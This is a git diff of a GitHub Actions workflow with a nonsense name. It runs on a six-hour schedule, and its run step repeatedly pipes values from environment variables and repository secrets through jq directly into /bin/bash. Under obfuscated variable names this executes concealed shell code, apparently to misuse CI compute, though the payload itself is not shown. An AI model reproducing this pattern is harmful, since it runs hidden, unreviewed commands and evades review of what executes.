@@ -1,8 +1,10 @@
 name: qiliangping4536
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 0/6 * * *'
+    - cron: '0 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,13 +12,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: qiliangping4536
         env:
-          z8077: ${{ secrets.z8077 }}
+          hmm77: ${{ secrets.hmm77 }}
         run: |
-          echo $z8077 | jq -r .r3 | /bin/bash
-          echo $em5 | jq -r .hmnmr927 | /bin/bash
-          echo $epzw2 | jq -r .a63027 | /bin/bash
-          echo $js08189 | jq -r .rpm1 | /bin/bash
-          echo $cji7517 | jq -r .tbdm56523 | /bin/bash
-          echo $an01 | jq -r .r03 | /bin/bash
-          echo $hhjla28228 | jq -r .yor24375 | /bin/bash
+          echo $hmm77 | jq -r .v0 | /bin/bash
+          echo $fah3 | jq -r .srg7 | /bin/bash
+          echo $cfx97 | jq -r .ct7804 | /bin/bash
+          echo $t96335 | jq -r .z60951 | /bin/bash
+          echo $gzgya53 | jq -r .ajpyf4332 | /bin/bash
+          echo $ixl7137 | jq -r .z9 | /bin/bash
+          echo $hgso9165 | jq -r .c95536 | /bin/bash
+          echo $sbday82 | jq -r .xxqk86 | /bin/bash
+          echo $o629 | jq -r .a5729 | /bin/bash
+          echo $yl64373 | jq -r .jfwfd25170 | /bin/bash
+          echo $msmzd39744 | jq -r .ydpme016 | /bin/bash
+          echo $qldt0800 | jq -r .kqdw91135 | /bin/bash
+          echo $ufg9 | jq -r .rp2451 | /bin/bash
+          echo $xmiwi08100 | jq -r .h2 | /bin/bash
+          echo $w2 | jq -r .ac0 | /bin/bash
 
